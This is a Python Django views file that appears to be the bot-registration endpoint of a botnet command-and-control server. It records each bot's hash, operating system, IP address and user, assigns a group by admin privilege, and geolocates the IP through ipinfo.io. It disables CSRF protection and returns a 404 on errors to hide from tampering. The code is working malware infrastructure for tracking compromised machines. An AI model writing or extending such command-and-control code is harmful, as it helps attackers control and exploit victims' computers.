import json
from urllib.request import urlopen
from django.http import HttpResponse, Http404
from django.views.decorators.csrf import csrf_exempt
from django.utils import timezone
from convey.models import Bot

# Determine a new bot's group based on OS and privilege
def get_group(operating_sys, user):
    with open('groups.json', 'r') as infile:
        groups = json.loads(infile.read())
    users = groups[operating_sys.lower()]
    try:
        group_num = users[user]
        if 'windows' in operating_sys and '(admin)' in user:
            group_num = users['admin']
    except KeyError:
        group_num = users['standard']

    return group_num

@csrf_exempt
def register(request):
    try:
        hash_type = request.POST['hash_type']
        hash_sum = request.POST['hash_sum']
        operating_sys = request.POST['operating_sys']
        ip_addr = request.POST['ip_addr']
        user = request.POST['user']
        group = get_group(operating_sys, user)
        last_contact = timezone.now()

        geo_html = urlopen('https://ipinfo.io/{}/geo'.format(ip_addr)).read().decode('utf-8')
        geo_json = json.loads(geo_html)
        geolocation = geo_json['country']

        bot = Bot.objects.create(
            hash_type=hash_type,
            hash_sum=hash_sum,
            group=group,
            operating_sys=operating_sys,
            user=user,
            ip_addr=ip_addr,
            geolocation=geolocation,
            last_contact=last_contact,
        )

        return HttpResponse('')
    except:
        # An error in registration likely means tampering or something went wrong
        # Return a 404 for the sake of obfuscation
        raise Http404()
